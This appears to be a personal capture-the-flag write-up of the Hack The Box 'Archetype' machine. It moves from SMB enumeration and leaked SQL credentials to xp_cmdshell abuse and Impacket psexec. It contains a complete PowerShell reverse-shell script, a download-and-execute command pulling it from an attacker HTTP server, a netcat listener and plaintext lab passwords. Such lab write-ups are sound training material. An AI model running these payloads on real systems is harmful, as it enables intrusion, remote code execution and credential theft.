# what did I learn
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- sql
  - check if I have sysadmin privilage
  - ```xp_cmdshell``` to execute commands
- always check PowerShell history file
  - ```type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt```
- windows revers shell call ```shell.ps1```

# Enumerating
start with nmap. you wil find out that port 443 SMB and 1433 SQL server are open.

use ```smbclient``` and try to find out if we can anonymous access SMB.

```console
kali@kali:~/HTB$ smbclient -L \\\\10.10.10.27\\ # list all directory
kali@kali:~/HTB$ smbclient \\\\10.10.10.27\\ADMIN$ # try to connect admin but didnt work
kali@kali:~/HTB$ smbclient \\\\10.10.10.27\\backups # work with backup 
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls # list file
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

                10328063 blocks of size 4096. 8170812 blocks available
smb: \> get prod.dtsConfig # download it
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (3.9 KiloBytes/sec) (average 3.9 KiloBytes/sec)
smb: \> exit 
kali@kali:~/HTB$ cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```
as you can see, we get the username and password for SQL server.

# foothold
clone [Impacket](https://github.com/SecureAuthCorp/impacket). run this to install
```console
pip3 install -r requierments.txt.
sudo setup.py install
```
now move to ```/impacket/examples``` we will use mssqlclient.py to connect to the sql server.
```console
kali@kali:~/impacket/examples$ python3 mssqlclient.py <username>@<ip> -windows-auth
```
We can use the ```IS_SRVROLEMEMBER``` function to reveal whether the current SQL user has sysadmin (highest level) privileges on the SQL Server. if so it will response **1**. use the command below:
```sql
select IS_SRVROLEMEMBER('sysadmin')
```
As sysadmin, we will be able to use ```xp_cmdshell```. we can execute this following commad to find out if we have admin privilage on the target
```sql
EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1
reconfigure;
xp_cmdshell "whoami" 
```
Nope the sql server is running in the context of the user ```ARCHETYPE\sql_svc``` However, this account doesn't seem to have administrative privileges on the host.


never mind, we will try to exploit it and try to get user flag by creating a revers shell and upload on our http server. then trick the sql server to download shell from our server. Lastly we will set up ```netcat``` and waiting for revers shell.


create ```shell.ps1``` this as the content
```shell
 $client = New-Object System.Net.Sockets.TCPClient("YOUR IP",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
```
now use python simple http server
```console
kali@kali:~/HTB$ python3 -m http.server 80 
```
in another terminal. run netcat and listen on the same port which we have in our payload, in this case port 1234
```console
kali@kali:~/HTB$ nc -lvnp 1234
```
now execute this on in SQL server. This command will get the payload from ur http server and execute the revers shell thougth ```xp_cmdshell```
```sql
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://<YOUR IP>/shell.ps1\");" 
```
Now just wait. and monitor the terminal which u executed ```netcat``` you will recieve the shell as *sql_sv* now try to find the flag (hint in desktop)

# Priv Esc
The next step is try to root the machine: the good place to look at is it is worth checking for frequently access files or executed commands. We can use the command below to access the PowerShell history file.
```cmd
# type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```
This reveals that the backups drive has been mapped using the local administrator credentials. As you can see here. we got admin password!


Now can use Impacket's ```psexec.py``` to gain a privileged shell. 
```console
kali@kali:~/impacket/examples$ python3 psexec.py administrator@10.10.10.27
```
now run ```whoami``` if the results is ```nt authority\system``` that means we root the machine. then last step is try to find root flag